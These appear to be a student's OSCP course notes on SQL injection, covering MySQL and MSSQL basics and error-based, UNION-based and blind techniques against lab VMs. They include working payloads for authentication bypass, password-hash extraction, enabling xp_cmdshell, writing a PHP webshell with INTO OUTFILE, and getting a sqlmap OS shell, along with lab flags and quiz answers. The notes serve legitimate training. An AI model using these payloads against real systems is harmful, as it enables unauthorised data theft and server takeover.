# Module 10: SQL Injection Attacks

## Tags
#OSCP #Module10 #SQLInjection #MySQL #MSSQL #UnionSQLi #BlindSQLi #Sqlmap #XpCmdshell

---

## **Why This Module Matters**
SQL injection is currently ranked third on OWASP's Top 10 (A03:2021-Injection), and it shows up constantly in real assessments. The core idea is simple: a web app builds a database query out of user input without sanitizing it, so you can reshape that query to pull data (or worse) you were never meant to see.

This module covers the theory and syntax differences between database engines, manual exploitation techniques (error-based, UNION-based, blind), and getting to full code execution both manually and with sqlmap.

**⚠️ Status:** 10.1 and 10.2 fully done. 10.3 theory written up, its 6 labs still to do live.

---

## 10.1. SQL Theory and Databases

### 10.1.1. SQL Theory Refresher

**The basic flow:** frontend (HTML/CSS/JS) sends user input to a backend (PHP, Java, Python, whatever), and the backend builds a SQL query using that input to talk to the database.

**Example query:**
```sql
SELECT * FROM users WHERE user_name='leon'
```
`SELECT *` grabs every column. `FROM users` names the table. `WHERE user_name='leon'` filters to one row.

**How this shows up in real backend code (PHP example):**
```php
<?php
$uname = $_POST['uname'];
$passwd = $_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```
*Note: the `i` in `mysqli_query` stands for "improved," nothing to do with injection. The `i` in SQLi stands for injection. Easy to mix up at a glance.*

**The vulnerability, in one sentence:** `$uname` and `$passwd` go straight from user input into the query string with no validation. If you type `leon`, the query becomes `... WHERE user_name= leon`. If you type `leon '+!@#$` instead, the query becomes `... WHERE user_name= leon'+!@#$`, and nothing stops that from reaching the database as-is. That gap is the whole vulnerability.

#### Tags: #SQLTheory #SQLQueryBasics #PHPMySQLi

---

### 10.1.2. DB Types and Characteristics

Different database engines (MySQL, MSSQL, PostgreSQL, Oracle) have different syntax, functions, and quirks. This module focuses on **MySQL** and **MSSQL**, both common on-prem and in the cloud.

**MySQL (and MariaDB, its open-source fork):**

**Step 1: Connect to a remote MySQL instance**
```bash
mysql -u root -p'root' -h <target> -P 3306 --skip-ssl-verify-server-cert
```
*If you get `ERROR 2026 (HY000) TLS/SSL error`, add `--skip-ssl` instead.*
![[Pasted image 20260801235847.png]]
**Step 2: Check the version**
```sql
select version();
```

**Step 3: Check the current session's user**
```sql
select system_user();
```
*Returns something like `root@<your_ip>`, confirming you're connected as the database-level `root` user (not the OS-level root, a separate concept entirely).*

**Step 4: List all databases**
```sql
show databases;
```

**Step 5: Pull a specific user's password hash**
```sql
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```
*MySQL stores this as a hash (e.g. Caching-SHA-256), not plaintext. Hash cracking is covered in a later module.*
![[Pasted image 20260802000127.png]]
**MSSQL, native to the Windows ecosystem:**

Windows has a built-in `sqlcmd` tool, but from Kali you'll usually use **Impacket**'s `impacket-mssqlclient`, which speaks the TDS protocol MSSQL uses.

**Step 1: Connect with Windows authentication (NTLM, not Kerberos)**
```bash
impacket-mssqlclient Administrator:Lab123@<target> -windows-auth
```
![[Pasted image 20260802001053.png]]
**Step 2: Check the SQL Server and underlying Windows version**
```sql
SELECT @@version;
```
*Returns both the MSSQL version and the Windows Server build in one shot.*

*Note: when using `sqlcmd` directly (not `impacket-mssqlclient`), statements need a trailing `GO` on their own line. Over `impacket-mssqlclient`'s remote TDS connection, `GO` isn't needed since it's not actually part of the TDS protocol, just a `sqlcmd`-client convention.*

**Step 3: List databases**
```sql
SELECT name FROM sys.databases;
```
*`master`, `tempdb`, `model`, `msdb` are defaults, present on every install. Anything else (e.g. `offsec`) is custom, and worth digging into first.*
![[Pasted image 20260802001330.png]]
**Step 4: List tables in a custom database**
```sql
SELECT * FROM offsec.information_schema.tables;
```

**Step 5: Dump a table's contents**
```sql
select * from offsec.dbo.users;
```
*Note the `dbo` schema name required between the database and table names for MSSQL, MySQL doesn't need this.*
![[Pasted image 20260802001858.png]]
#### Tags: #MySQLBasics #MSSQLBasics #ImpacketMSSQLClient #TDSProtocol #SysDatabases

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| VM #1 (MySQL): which plugin value is used as the password authentication scheme for user `offsec`? | **caching_sha2_password** |
| VM #2 (MSSQL): value of the first user listed in `sysusers` inside the `master` database? | **public** (`SELECT * FROM master.sys.sysusers;`, `uid 0`) |
| VM #3 (MySQL): flag from the `users` table? | **OS{9c1e71972d608dc0a75a770dda1af097}** (in the `test` database's `users` table, `username` column, row `id 4`, alongside Mario-character decoy rows) |

#### Tags: #Lab #Quiz #Module10

---

## 10.2. Manual SQL Exploitation

Automated tools like sqlmap can find and exploit SQLi fast, but understanding the manual mechanics first means you can actually reason about why a payload works (or doesn't) when the automated tool needs a hint.

### 10.2.1. Identifying SQLi via Error-Based Payloads

**Authentication bypass, the classic first move:**
```
offsec' OR 1=1 -- //
```
*Closes the quote early, adds an always-true `OR 1=1`, then comments out the rest of the original query with `-- ` (two dashes and a space, minimum). The trailing `//` here isn't SQL syntax, it's just a visual marker the module uses so the comment is obvious at a glance and to add a small buffer against whitespace-stripping filters.*

This turns:
```sql
SELECT * FROM users WHERE user_name= 'offsec' AND password='wrong'
```
into effectively:
```sql
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --' AND password='wrong'
```
*The `OR 1=1` makes the WHERE clause always true, and the password check gets commented out entirely.*

**Step 1: Confirm you can reach the app and it behaves normally**
Log in with a wrong password first (e.g. `offsec`/`jam`) and confirm you get an "Invalid Password" message.

![[Pasted image 20260802143007.png]]

**Step 2: Test for injection with a single quote**
Type a single `'` into the username field and submit.
*A SQL syntax error coming back (rather than the normal "invalid password" message) confirms your input is reaching the database unsanitized. This is called an **in-band** SQLi since the query's effect is visible directly in the app's own response, most production apps suppress these error messages, so don't expect this every time.*
![[Pasted image 20260802143114.png]]

**Step 3: Submit the auth bypass payload**
```
offsec' OR 1=1 -- //
```
in the username field. *"Authentication Successful" confirms it worked.*

>![[Pasted image 20260802143202.png]]

**Going further, error-based enumeration:** since we can trigger database errors that leak information, we can use that channel to extract data one piece at a time.

**Step 4: Confirm you can extract arbitrary values via an error message**
```
' or 1=1 in (select @@version) -- //
```
*The `IN` operator here is being abused: comparing a boolean (`1=1`) against what should be a single value (the version string) forces a type-mismatch error, and MySQL's error message itself often includes the offending value. Expect the MySQL version number to show up in the error text.*
![[Pasted image 20260802143305.png]]

**Step 5: Try to dump a whole table at once (expect this to fail)**
```
' OR 1=1 in (SELECT * FROM users) -- //
```
*Error: subqueries used this way can only return **one column**. This tells you to narrow down to a single column at a time.*
![[Pasted image 20260802143411.png]]

**Step 6: Extract one column at a time**
```
' or 1=1 in (SELECT password FROM users) -- //
```
*Returns password hashes, but with no way to tell which hash belongs to which user.*
![[Pasted image 20260802143514.png]]

**Step 7: Narrow to a specific user**
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
*Now you get exactly the `admin` user's password hash, one clean value at a time. Slow, but works when nothing else does.*
![[Pasted image 20260802143551.png]]

**Worked result (VM #1):** MySQL version leaked was `8.0.28`. Full password hash dump: `21232f297a57a5a743894a0e4a801fc3`, `f9664ea1803311b35f81d07d8c9e072d`, `5f4dcc3b5aa765d61d8327deb882cf99`, `5653c6b1f51852a6351ec69c8452abc6`. Isolated `admin`'s hash: `21232f297a57a5a743894a0e4a801fc3` (recognizable as the well-known MD5 of the plain word "admin").

> **Lab answer, VM #1:** the PHP variable storing the username field's input is **`$uid`**, not the generic `$uname` used in the module's illustrative code snippet. This VM's actual login form uses input field `name="uid"` (confirmed via `curl` + viewing the page source), so the matching backend variable follows that name instead. Worth remembering: a module's generic example code won't always match a specific lab VM's actual field/variable names exactly, check the live page source when in doubt rather than assuming the textbook snippet is verbatim.

#### Tags: #ErrorBasedSQLi #AuthBypass #SQLCommentSyntax #InSubqueryTrick

---

### 10.2.2. UNION-Based Payloads

Whenever the app reflects query results back to you (in-band), `UNION` is usually the fastest exploitation path. `UNION` lets you bolt a second `SELECT` onto the original query and get both results back together.

**Two conditions for UNION SQLi to work:**
1. The injected `UNION SELECT` must have the **same number of columns** as the original query.
2. The **data types** need to be compatible column-by-column.

**Step 1: Find the exact column count**
```
' ORDER BY 1-- //
```
Increment the number each time. When you hit a number the table doesn't have, `ORDER BY` errors out, telling you the previous number was the actual column count.
![[Pasted image 20260802144642.png]]

**Step 2: Confirm which columns are visible in the output**
```
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```
*(Adjust the number of values to match your confirmed column count.) Whichever placeholder values actually show up in the rendered page tell you which columns the app actually displays.*
![[Pasted image 20260802144722.png]]

**Step 3: Enumerate the database, watching for type mismatches**
```
%' UNION SELECT database(), user(), @@version, null, null -- //
```
*If the first visible column is normally an integer ID, putting a string function there can silently fail to display (not necessarily error) since the app's own formatting expects a number. Fix: shift your enumeration functions to columns that actually render as text.*
```
' UNION SELECT null, null, database(), user(), @@version -- //
```
![[Pasted image 20260802144811.png]]

**Step 4: Enumerate other tables via `information_schema`**
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
*This is the generic, database-agnostic way to discover table/column names you don't already know about, works the same way regardless of what the app's own schema looks like.*
![[Pasted image 20260802144900.png]]

**Step 5: Dump a discovered table**
```
' UNION SELECT null, username, password, description, null FROM users -- //
```
![[Pasted image 20260802144940.png]]

**Worked result (VM #1, `/search.php`):** 5 columns total, column 1 is the integer ID (doesn't render string values). Current DB: `offsec`, user `root@172.30.0.3`, version `8.0.28`. Found tables `customers` and `users` via `information_schema`. Full `users` dump:

| username | password | description |
|---|---|---|
| admin | 21232f297a57a5a743894a0e4a801fc3 | this is the admin |
| offsec | f9664ea1803311b35f81d07d8c9e072d | try harder |
| boba | 5f4dcc3b5aa765d61d8327deb882cf99 | freeze |
| han | 5653c6b1f51852a6351ec69c8452abc6 | pew pew |

*Matches the hashes already pulled via error-based extraction earlier, good cross-check that both techniques found the same data.*

> **Lab answer, VM #1:** besides matching data types, a UNION SQLi payload must also use a **matching number of columns** as the original query. (The concept is "same column count", but the lab's answer-checker specifically wanted the phrase "matching number of columns", the near-identical "same number of columns" got rejected, worth remembering these checkers can be picky about exact wording even when the concept is right.)

#### Tags: #UnionSQLi #ColumnCountEnumeration #InformationSchema #TypeMismatch

---

### 10.2.3. Blind SQL Injections

Sometimes the app never reflects the query's actual data back to you at all, no error text, no visible output difference. That's **blind** SQLi, and you infer results indirectly instead.

- **Boolean-based blind:** the app's response *changes shape* (not its literal content) depending on whether your injected condition is TRUE or FALSE, e.g. a valid-user page vs. an error page.
- **Time-based blind:** you make the database *pause* for a set number of seconds if a condition is true, and time the response to infer the answer.

**Boolean-based test:**
```
http://<target>/blindsqli.php?user=offsec' AND 1=1 -- //
```
*Since `1=1` is always true, this should behave identically to a plain valid request, confirming the injection point without needing any visible error.*
![[Pasted image 20260802145836.png]]

**FALSE-case test, for contrast:**
```
http://<target>/blindsqli.php?user=offsec' AND 1=2 -- //
```
*Since `1=2` is always false, expect the record fields to come back empty, the actual behavioral difference that makes this "boolean-based."*
![[Pasted image 20260802150220.png]]

**Time-based test:**
```
http://<target>/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
*If the app hangs for ~3 seconds, that confirms both the injection point and that `offsec` is a real user, all without seeing a single byte of database output.*
![[Pasted image 20260802150257.png]]

**Worked result (VM #1, logged in as `offsec`/`lab`, then `blindsqli.php?user=offsec`):**
- Baseline: `Username: offsec`, `Password Hash: f9664ea1803311b35f81d07d8c9e072d`, `Description: try harder`.
- `AND 1=1` (TRUE): identical to baseline, full record returned.
- `AND 1=2` (FALSE): all three fields empty, confirming the behavioral difference boolean-based blind SQLi relies on.
- Time-based `sleep(3)` payload: page took ~3 seconds to load, confirming the injection point purely through timing, with the fields themselves coming back empty in this case (the delay itself was the useful signal, not the rendered content).

🔁 **Similar to:** this "no visible output, but a *change in behavior* still tells you something" idea is the exact same principle from [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1's capstone]] (a response going blank instead of echoing input was itself a signal). Blind SQLi just formalizes that idea into two named categories (boolean, time) instead of ad-hoc observation.

**Practical note:** always test both a known-valid value and a deliberately-wrong one side by side, so you have a baseline to compare against. Manually walking a full blind SQLi to extract real data is slow, hence sqlmap exists (next section).

> 🔗 **HackTricks** and **PayloadsAllTheThings** both have extensive SQL injection cheat sheets (per-DBMS syntax variations, more payload types) worth bookmarking.

#### Tags: #BlindSQLi #BooleanBasedBlind #TimeBasedBlind #SleepPayload

**Lab status: ✅ Completed:**

| Question                                                                                 | Answer                                                                                                                         |
| ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| Which PHP variable stores the user's input in the auth-bypass example?                   | **`$uid`** (this VM's actual form field is `name="uid"`, not the module's generic `$uname` example)                            |
| UNION-based attack: what condition, besides matching data types, must also be satisfied? | **Matching number of columns** (exact accepted phrasing, "same number of columns" was rejected despite being the same concept) |
| Blind SQLi: since DB output is never returned, what's used instead to infer results?     | **The web application's own output/behavior** (its response content or timing), not the database directly                      |

#### Tags: #Lab #Quiz #Module10

---

## 10.3. Manual and Automated Code Execution

### 10.3.1. Manual Code Execution

Depending on the DBMS, getting from SQLi to actual OS command execution looks different.

**MSSQL: `xp_cmdshell`**

`xp_cmdshell` runs a string as an OS command and returns the output as rows. It's disabled by default and needs enabling first.

**Step 1: Enable advanced options**
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
```

**Step 2: Enable `xp_cmdshell`**
```sql
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Step 3: Run a command**
```sql
EXECUTE xp_cmdshell 'whoami';
```
*Note `EXECUTE`, not `SELECT`, once a feature like this is enabled.*

From here, escalate to a proper reverse shell the same way as any other Windows RCE (see [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] for the PowerShell base64 pattern, or [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] for Powercat).

**MySQL: `SELECT ... INTO OUTFILE`**

MySQL has no single "run a shell command" function, but if the OS user running MySQL has write access to a web-servable directory, you can write a webshell to disk directly via a UNION payload.

**Step 1: Write a PHP webshell via UNION + INTO OUTFILE**
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
*Expect a type-mismatch error in the app's own response, that's fine and doesn't stop the file write from succeeding underneath. Requires the target directory to actually be writable by the DB process's OS user.*

**Step 2: Confirm and use the webshell**
```bash
curl "http://<target>/tmp/webshell.php?cmd=id"
```
*Same `cmd`-parameter webshell pattern as [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]]'s `simple-backdoor.php` and [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s uploaded shells, just delivered via SQLi's file-write primitive instead of an upload form or RFI.*

#### Tags: #XpCmdshell #IntoOutfile #MySQLWebshell #SpConfigure

---

### 10.3.2. Automating the Attack

**sqlmap** automates discovery, fingerprinting, and exploitation of SQLi across most DBMS engines.

**Step 1: Basic discovery scan**
```bash
sqlmap -u "http://<target>/blindsqli.php?user=1" -p user
```
*`-u` is the target URL, `-p` names the parameter to test. Confirms the injection type (e.g. time-based blind), the DBMS, the web server OS, and the app's tech stack, all from one scan.*

> **Caution:** sqlmap is loud, high traffic volume, easy to notice on a monitored network. Not a first choice when stealth matters.

**Step 2: Dump the current database**
```bash
sqlmap -u "http://<target>/blindsqli.php?user=1" -p user --dump
```
*Against a time-based blind injection this can be genuinely slow (each byte extracted means more timing probes), just let it run.*

**Step 3: Get a full interactive OS shell via `--os-shell` (for UNION-based injections, much faster than time-based for this)**

First, capture the vulnerable POST request in Burp and save it to a file (e.g. `post.txt`).

Then:
```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```
*`-r` reads the request from a saved file instead of building one from a URL, `--web-root` tells sqlmap where to try writing its webshell stager, matching whatever writable path you found earlier.*
*You'll be prompted for the backend language (PHP, ASP, ASPX, JSP), pick whichever matches your target. sqlmap then uploads a stager + webshell automatically and drops you into an `os-shell>` prompt.*

🔁 **Similar to:** `--os-shell` is doing exactly the same `INTO OUTFILE` + webshell trick from 10.3.1 manually, sqlmap just automates the write, the upload, and the `cmd`-parameter interaction into one flow.

#### Tags: #Sqlmap #SqlmapDump #SqlmapOsShell #WebRootParam

**Lab status: 🔲 Not yet completed, 6 VMs pending:**

| Question | Status |
|---|---|
| MSSQL VM #1: which config option must be enabled before `xp_cmdshell` itself? | Pending |
| MySQL VM #2 (manual): flag in the `tmp` folder after getting a webshell via UNION + `INTO OUTFILE`? | Pending |
| MySQL VM #2 (sqlmap): flag from the `users` table, dumped via time-based blind SQLi? | Pending |
| Capstone Exercise VM #1: flag? | Pending |
| Capstone Exercise VM #2: flag? | Pending |
| Capstone Exercise VM #3: flag? | Pending |
| Capstone Exercise VM #4: flag? | Pending |

#### Tags: #Lab #Quiz #Module10

---

## 10.4. Wrapping Up

This module covered identifying and enumerating SQL injection vulnerabilities, then exploiting them three ways: **error-based** (leak data through database error messages), **UNION-based** (bolt a second query onto the original and read its output directly), and **blind** (boolean or time-based, when there's no visible output at all). From there, both MSSQL (`xp_cmdshell`) and MySQL (`INTO OUTFILE` + webshell) can turn a SQLi into full OS command execution, and sqlmap automates the entire chain, discovery through to an interactive shell.

The throughline for the whole module: SQLi is really just another case of "user input reaches a place it shouldn't be trusted," the same root cause behind every vulnerability class in [[Common Web Application Attacks]], just with a database query as the target instead of a filesystem path or a shell command.

#### Tags: #SQLInjectionSummary #Module10Recap

---

## **Outstanding Sections**
- [x] **10.1 SQL Theory and Databases**: done, all 3 VMs complete (MySQL VM #1, MSSQL VM #2, MySQL VM #3)
- [x] **10.2 Manual SQL Exploitation**: done, all 3 questions answered (error-based, UNION-based, blind, all on the same VM)
- [ ] **10.3 Manual and Automated Code Execution**: theory done, **6 VMs pending** (MSSQL xp_cmdshell, MySQL manual webshell, MySQL sqlmap dump, 4 capstone exercises)
- [x] **10.4 Wrapping Up**: done
